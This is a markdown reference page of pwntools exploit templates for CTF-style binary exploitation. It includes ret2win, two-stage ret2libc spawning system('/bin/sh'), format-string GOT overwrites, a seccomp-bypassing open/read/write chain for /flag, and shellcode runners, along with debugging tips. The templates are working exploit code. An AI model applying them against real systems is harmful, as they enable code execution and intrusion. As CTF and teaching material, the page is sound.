# pwntools Boilerplate — [Back to Main](../README.md)

Templates for exploit scripts. Keep the exploit logic in one place and make local/GDB/remote modes switchable.

---

## Standard exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

exe = './target'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

HOST = args.HOST or '127.0.0.1'
PORT = int(args.PORT or 31337)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path] + argv, *a, **kw)


gdbscript = '''
set pagination off
break main
continue
'''

io = start()

# exploit here
io.interactive()
```

Run modes:

```bash
python3 solve.py
python3 solve.py GDB
python3 solve.py REMOTE HOST=challenge.host PORT=31337
```

---

## Common helpers

```python
# Packing/unpacking
p64(0xdeadbeef)
p32(0xdeadbeef)
u64(data.ljust(8, b'\x00'))
u32(data.ljust(4, b'\x00'))

# Flat payloads
payload = flat(
    b'A' * OFFSET,
    0x40101a,      # ret
    elf.sym['win'],
)

# Cyclic patterns
data = cyclic(400)
offset = cyclic_find(0x6161616b)  # crashed qword/dword; use exact observed value

# Send/receive
io.sendlineafter(b'> ', payload)
io.sendafter(b'data: ', payload)
line = io.recvline()
io.recvuntil(b'leak: ')
leak = int(io.recvline().strip(), 16)
```

---

## ret2win template

```python
from pwn import *

elf = context.binary = ELF('./target', checksec=False)
io = process(elf.path)

OFFSET = 72
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * OFFSET,
    ret,             # stack alignment
    elf.sym['win'],
)

io.sendlineafter(b'> ', payload)
io.interactive()
```

---

## ret2libc two-stage template

```python
#!/usr/bin/env python3
from pwn import *

elf  = context.binary = ELF('./target', checksec=False)
libc = ELF('./libc.so.6', checksec=False)  # use remote libc when known

HOST = args.HOST or '127.0.0.1'
PORT = int(args.PORT or 31337)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

io = start()
rop = ROP(elf)

OFFSET  = 72
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# Stage 1: leak puts@libc
payload = flat(
    b'A' * OFFSET,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)
io.sendlineafter(b'> ', payload)

io.recvuntil(b'leak marker if needed\n')
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# Stage 2: system('/bin/sh')
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat(
    b'A' * OFFSET,
    ret,             # align stack for libc
    pop_rdi,
    binsh,
    libc.sym['system'],
)
io.sendlineafter(b'> ', payload)
io.interactive()
```

---

## Format string template

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./target', checksec=False)
io = process(elf.path)

# First find offset manually with %p.%p.%p or FmtStr.
offset = 7

# Example: overwrite puts@got with win (Partial RELRO only)
payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['win']})
io.sendlineafter(b'> ', payload)
io.interactive()
```

Automatic offset finder pattern:

```python
from pwn import *

elf = context.binary = ELF('./target', checksec=False)

def exec_fmt(payload):
    io = process(elf.path)
    io.sendline(payload)
    data = io.recvall(timeout=1)
    io.close()
    return data

fmt = FmtStr(exec_fmt)
log.info(f'offset = {fmt.offset}')
```

---

## ORW syscall chain template

When `execve` is blocked by seccomp, build open/read/write instead.

```python
from pwn import *

elf = context.binary = ELF('./target', checksec=False)
io = process(elf.path)

OFFSET = 72
rop = ROP(elf)

bss = elf.bss(0x100)
flag_path = b'/flag\x00'

# Need gadgets: pop rdi/rsi/rdx/rax; syscall; and a write-what-where or read stage.
# Common plan: first call read(0, bss, 0x100), send '/flag\0', then ORW.
rop.read(0, bss, 0x100)
rop.open(bss, 0, 0)
rop.read(3, bss + 0x20, 0x100)  # fd often 3; confirm if needed
rop.write(1, bss + 0x20, 0x100)

payload = flat(b'A' * OFFSET, rop.chain())
io.sendlineafter(b'> ', payload)
io.send(flag_path)
print(io.recvall(timeout=2))
```

If pwntools cannot auto-build a syscall chain, manually load registers using gadgets and `syscall; ret`.

---

## Shellcode runner template

```python
from pwn import *

context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
# or: shellcode = asm(shellcraft.cat('/flag'))

io = process('./target')
io.sendline(shellcode)
io.interactive()
```

Debug shellcode:

```python
io = gdb.debug('./target', '''
break *main
continue
''')
```

---

## Notes that prevent wasted time

- Always set `context.binary = ELF(...)`; it fixes architecture/endian assumptions.
- If `system('/bin/sh')` crashes on amd64, add a single `ret` before the call for stack alignment.
- Use `sendafter`/`sendlineafter` so scripts wait for prompts instead of racing.
- Keep `REMOTE`, `GDB`, and local modes in one script so fixes carry across modes.
- Log derived bases and leaks with `log.success(hex(value))`; do not trust mental math.
